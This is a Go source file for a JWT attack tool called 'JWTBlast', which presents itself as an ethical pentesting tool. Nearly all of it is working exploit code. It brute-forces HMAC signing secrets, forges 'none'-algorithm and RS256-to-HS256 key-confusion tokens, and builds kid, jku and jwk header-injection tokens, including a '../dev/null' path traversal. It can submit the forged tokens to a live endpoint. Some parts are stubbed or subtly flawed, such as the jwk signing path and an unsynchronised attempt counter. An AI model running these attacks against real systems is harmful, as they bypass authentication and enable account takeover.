package main

import (
	"bufio"
	"crypto/hmac"
	"crypto/md5"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"runtime"
	"strings"
	"sync"

	"github.com/golang-jwt/jwt/v5"
)

type Config struct {
	Token          string
	DictFile       string
	PubKeyFile     string
	Endpoint       string
	ModifiedClaims string
	ReportFile     string
	Workers        int
}

type Report struct {
	FoundSecret    string            `json:"found_secret"`
	Attempts       int               `json:"attempts"`
	Vulnerabilities []string          `json:"vulnerabilities"`
	Recommendations []string         `json:"recommendations"`
	Logs           []string          `json:"logs"`
}

func main() {
	if len(os.Args) < 2 {
		usage()
		os.Exit(1)
	}

	cmd := os.Args[1]
	switch cmd {
	case "brute":
		bruteCmd := flag.NewFlagSet("brute", flag.ExitOnError)
		token := bruteCmd.String("token", "", "JWT token to crack")
		dict := bruteCmd.String("dict", "", "Dictionary file")
		workers := bruteCmd.Int("workers", runtime.NumCPU(), "Number of worker goroutines")
		report := bruteCmd.String("report", "report.json", "Report file")
		bruteCmd.Parse(os.Args[2:])

		if *token == "" || *dict == "" {
			bruteCmd.Usage()
			os.Exit(1)
		}

		cfg := Config{Token: *token, DictFile: *dict, Workers: *workers, ReportFile: *report}
		bruteForce(&cfg)

	case "none":
		noneCmd := flag.NewFlagSet("none", flag.ExitOnError)
		token := noneCmd.String("token", "", "JWT token")
		endpoint := noneCmd.String("endpoint", "", "Target endpoint for online test")
		modified := noneCmd.String("modified-claims", "", "JSON string of modified claims")
		report := noneCmd.String("report", "report.json", "Report file")
		noneCmd.Parse(os.Args[2:])

		if *token == "" {
			noneCmd.Usage()
			os.Exit(1)
		}

		cfg := Config{Token: *token, Endpoint: *endpoint, ModifiedClaims: *modified, ReportFile: *report}
		testNoneAlg(&cfg)

	case "confusion":
		confCmd := flag.NewFlagSet("confusion", flag.ExitOnError)
		token := confCmd.String("token", "", "JWT token")
		pubkey := confCmd.String("pubkey", "", "Public key file (PEM)")
		endpoint := confCmd.String("endpoint", "", "Target endpoint for online test")
		report := confCmd.String("report", "report.json", "Report file")
		confCmd.Parse(os.Args[2:])

		if *token == "" || *pubkey == "" {
			confCmd.Usage()
			os.Exit(1)
		}

		cfg := Config{Token: *token, PubKeyFile: *pubkey, Endpoint: *endpoint, ReportFile: *report}
		testAlgConfusion(&cfg)

	case "inject":
		injCmd := flag.NewFlagSet("inject", flag.ExitOnError)
		token := injCmd.String("token", "", "JWT token")
		typeInj := injCmd.String("type", "kid", "Injection type: jwk, jku, kid")
		value := injCmd.String("value", "", "Injection value (e.g., path traversal for kid)")
		endpoint := injCmd.String("endpoint", "", "Target endpoint")
		report := injCmd.String("report", "report.json", "Report file")
		injCmd.Parse(os.Args[2:])

		if *token == "" || *value == "" {
			injCmd.Usage()
			os.Exit(1)
		}

		cfg := Config{Token: *token, Endpoint: *endpoint, ReportFile: *report}
		testHeaderInjection(&cfg, *typeInj, *value)

	case "scan":
		scanCmd := flag.NewFlagSet("scan", flag.ExitOnError)
		token := scanCmd.String("token", "", "JWT token")
		dict := scanCmd.String("dict", "", "Dictionary file")
		pubkey := scanCmd.String("pubkey", "", "Public key file")
		endpoint := scanCmd.String("endpoint", "", "Target endpoint")
		report := scanCmd.String("report", "report.json", "Report file")
		scanCmd.Parse(os.Args[2:])

		cfg := Config{Token: *token, DictFile: *dict, PubKeyFile: *pubkey, Endpoint: *endpoint, ReportFile: *report}
		fullScan(&cfg)

	default:
		usage()
		os.Exit(1)
	}
}

func usage() {
	fmt.Println("JWTBlast - Ethical JWT Pentesting Tool")
	fmt.Println("Commands:")
	fmt.Println("  brute --token <jwt> --dict <file> [--workers <n>] [--report <file>]")
	fmt.Println("  none --token <jwt> [--endpoint <url>] [--modified-claims <json>] [--report <file>]")
	fmt.Println("  confusion --token <jwt> --pubkey <pem> [--endpoint <url>] [--report <file>]")
	fmt.Println("  inject --token <jwt> --type <jwk|jku|kid> --value <inj> [--endpoint <url>] [--report <file>]")
	fmt.Println("  scan --token <jwt> --dict <file> --pubkey <pem> --endpoint <url> [--report <file>]")
}

func bruteForce(cfg *Config) {
	alg, err := getAlg(cfg.Token)
	if err != nil {
		log.Fatal(err)
	}
	if !strings.HasPrefix(alg, "HS") {
		log.Printf("Warning: Algorithm %s not symmetric; brute-force may not apply", alg)
	}

	secretsCh := make(chan string, cfg.Workers*10)
	resultsCh := make(chan string, 1)
	var wg sync.WaitGroup
	var attempts int

	for i := 0; i < cfg.Workers; i++ {
		wg.Add(1)
		go worker(cfg.Token, alg, secretsCh, resultsCh, &wg, &attempts)
	}

	go loadDictionaryWithTransforms(cfg.DictFile, secretsCh)

	go func() {
		wg.Wait()
		close(resultsCh)
	}()

	var found string
	for result := range resultsCh {
		found = result
		break
	}

	report := Report{
		FoundSecret: found,
		Attempts:    attempts,
		Recommendations: []string{"Use random 256-bit secrets", "Enforce HS512"},
	}
	writeReport(cfg.ReportFile, report)

	if found != "" {
		fmt.Printf("Secret found: %s\n", found)
	} else {
		fmt.Println("No secret found")
	}
}

func worker(token, alg string, secretsCh <-chan string, resultsCh chan<- string, wg *sync.WaitGroup, attempts *int) {
	defer wg.Done()
	for secret := range secretsCh {
		*attempts++
		if verifySignature(token, secret, alg) {
			resultsCh <- secret
			return
		}
	}
}

func loadDictionaryWithTransforms(file string, ch chan<- string) {
	f, err := os.Open(file)
	if err != nil {
		log.Fatal(err)
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		word := scanner.Text()
		ch <- word // plain
		ch <- md5Hex32(word)
		ch <- md5Hex16(word)
		ch <- base64Std(word)
		ch <- base64URL(word)
	}
	close(ch)
}

func md5Hex32(s string) string {
	hash := md5.Sum([]byte(s))
	return hex.EncodeToString(hash[:])
}

func md5Hex16(s string) string {
	hash := md5.Sum([]byte(s))
	return hex.EncodeToString(hash[:])[:16]
}

func base64Std(s string) string {
	return base64.StdEncoding.EncodeToString([]byte(s))
}

func base64URL(s string) string {
	return base64.URLEncoding.EncodeToString([]byte(s))
}

func getAlg(token string) (string, error) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return "", fmt.Errorf("invalid token")
	}
	headerBytes, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return "", err
	}
	var header struct {
		Alg string `json:"alg"`
	}
	if err := json.Unmarshal(headerBytes, &header); err != nil {
		return "", err
	}
	return header.Alg, nil
}

func verifySignature(tokenStr, secret, alg string) bool {
	parser := jwt.NewParser(jwt.WithoutClaimsValidation())
	keyFunc := func(t *jwt.Token) (interface{}, error) {
		return []byte(secret), nil
	}
	_, err := parser.Parse(tokenStr, keyFunc)
	return err == nil
}

func testNoneAlg(cfg *Config) {
	if cfg.Endpoint != "" {
		fmt.Print("Confirm online test (y/n): ")
		var input string
		fmt.Scanln(&input)
		if strings.ToLower(input) != "y" {
			return
		}
	}

	parts := strings.Split(cfg.Token, ".")
	header := `{"alg":"none","typ":"JWT"}`
	headerEnc := base64.RawURLEncoding.EncodeToString([]byte(header))

	var payload []byte
	if cfg.ModifiedClaims != "" {
		payload = []byte(cfg.ModifiedClaims)
	} else {
		payloadDec, _ := base64.RawURLEncoding.DecodeString(parts[1])
		payload = payloadDec
	}
	payloadEnc := base64.RawURLEncoding.EncodeToString(payload)

	forged := headerEnc + "." + payloadEnc + "."

	if cfg.Endpoint == "" {
		fmt.Printf("Forged 'none' token: %s\n", forged)
		report := Report{Vulnerabilities: []string{"Potential 'none' alg vulnerability"}, Logs: []string{forged}}
		writeReport(cfg.ReportFile, report)
		return
	}

	resp, err := http.Post(cfg.Endpoint, "application/json", strings.NewReader(`{"token":"`+forged+`"}`))
	if err == nil && resp.StatusCode < 300 {
		log.Println("Vulnerable to 'none' alg!")
		report := Report{Vulnerabilities: []string{"Confirmed 'none' alg acceptance"}}
		writeReport(cfg.ReportFile, report)
	} else {
		log.Println("Not vulnerable or error:", err)
		report := Report{Logs: []string{"Test failed or not vulnerable"}}
		writeReport(cfg.ReportFile, report)
	}
}

func testAlgConfusion(cfg *Config) {
	pubKeyBytes, err := os.ReadFile(cfg.PubKeyFile)
	if err != nil {
		log.Fatal(err)
	}
	block, _ := pem.Decode(pubKeyBytes)
	pubKey, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		log.Fatal(err)
	}
	rsaPub, ok := pubKey.(*rsa.PublicKey)
	if !ok {
		log.Fatal("Not RSA key")
	}
	_ = rsaPub // Suppress unused warning; used for type assertion

	pubKeyPEM := pem.EncodeToMemory(&pem.Block{Type: "PUBLIC KEY", Bytes: block.Bytes})
	secret := string(pubKeyPEM)

	parts := strings.Split(cfg.Token, ".")
	headerBytes, _ := base64.RawURLEncoding.DecodeString(parts[0])
	var header map[string]interface{}
	json.Unmarshal(headerBytes, &header)
	header["alg"] = "HS256"
	headerEnc, _ := json.Marshal(header)
	headerEncStr := base64.RawURLEncoding.EncodeToString(headerEnc)

	payloadEnc := parts[1]
	forgedBase := headerEncStr + "." + payloadEnc

	h := hmac.New(sha256.New, []byte(secret))
	h.Write([]byte(forgedBase))
	sig := h.Sum(nil)
	sigEnc := base64.RawURLEncoding.EncodeToString(sig)

	forged := forgedBase + "." + sigEnc

	if cfg.Endpoint == "" {
		fmt.Printf("Forged token: %s\n", forged)
		report := Report{Logs: []string{"Generated confusion token: " + forged}}
		writeReport(cfg.ReportFile, report)
		return
	}

	if confirmOnline(cfg) {
		sendToEndpoint(cfg.Endpoint, forged, cfg.ReportFile)
	}
}

func testHeaderInjection(cfg *Config, injType, value string) {
	if cfg.Endpoint != "" && !confirmOnline(cfg) {
		return
	}

	parts := strings.Split(cfg.Token, ".")
	headerBytes, _ := base64.RawURLEncoding.DecodeString(parts[0])
	var header map[string]interface{}
	json.Unmarshal(headerBytes, &header)

	var secret []byte
	var alg string = "HS256" // Default for injection

	switch injType {
	case "kid":
		header["kid"] = value // e.g., "../dev/null" for traversal
		secret = []byte("")   // Empty key for null file
	case "jku":
		header["jku"] = value // Malicious URL
		// Assume user hosts JWKS; sign with known key
		secret = []byte("attacker-secret")
	case "jwk":
		// Embed JWK; generate simple RSA for example
		jwk := map[string]interface{}{
			"kty": "RSA",
			"n":   "0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78LhWx4cbbfAAtVT86zwu1RK7aPFFxuhDR1L6tSoc_BJECPebWKRXjBZCiFV4n3oknjhMstn64tZ_2W-5JsGY4Hc5n9yBXArwl93lqt7_RN5w6Cf0h4QyQ5v-65YGjQR0_FDW2QvzqY368QQMicAtaSqzs8KJZgnYb9c7d0zgdAZHzu6qMQvRL5hajrn1n91CbOpbISD08qNLyrdkt-bFTWhAI4vMQFh6WeZu0fM4lFd2NcRwr3XPksINHaQ-G_xBniIqbw0Ls1jF44-csFCur-kEgU8awapJzKnqDKgw",
			"e":   "AQAB",
		}
		header["jwk"] = jwk
		// For signing, use corresponding private key (stub; in real, load private)
		secret = []byte("private-key-stub")
	default:
		log.Fatal("Invalid injection type")
	}

	header["alg"] = alg
	headerEnc, _ := json.Marshal(header)
	headerEncStr := base64.RawURLEncoding.EncodeToString(headerEnc)

	payloadEnc := parts[1]
	forgedBase := headerEncStr + "." + payloadEnc

	h := hmac.New(sha256.New, secret)
	h.Write([]byte(forgedBase))
	sig := h.Sum(nil)
	sigEnc := base64.RawURLEncoding.EncodeToString(sig)

	forged := forgedBase + "." + sigEnc

	fmt.Printf("Forged %s injection token: %s\n", injType, forged)

	if cfg.Endpoint != "" {
		sendToEndpoint(cfg.Endpoint, forged, cfg.ReportFile)
	} else {
		report := Report{Vulnerabilities: []string{"Generated " + injType + " injection token"}}
		writeReport(cfg.ReportFile, report)
	}
}

func fullScan(cfg *Config) {
	bruteForce(cfg)
	testNoneAlg(cfg)
	testAlgConfusion(cfg)
	// Call testHeaderInjection with defaults or add flags
	testHeaderInjection(cfg, "kid", "../dev/null") // Example
}

func writeReport(file string, report Report) {
	data, _ := json.MarshalIndent(report, "", "  ")
	os.WriteFile(file, data, 0644)
}

func confirmOnline(cfg *Config) bool {
	fmt.Print("Confirm online test (y/n): ")
	var input string
	fmt.Scanln(&input)
	return strings.ToLower(input) == "y"
}

func sendToEndpoint(endpoint, token, reportFile string) {
	resp, err := http.Post(endpoint, "application/json", strings.NewReader(`{"token":"`+token+`"}`))
	if err == nil && resp.StatusCode < 300 {
		log.Println("Vulnerable!")
		report := Report{Vulnerabilities: []string{"Confirmed vulnerability"}}
		writeReport(reportFile, report)
	} else {
		log.Println("Not vulnerable or error:", err)
		report := Report{Logs: []string{"Test failed"}}
		writeReport(reportFile, report)
	}
}
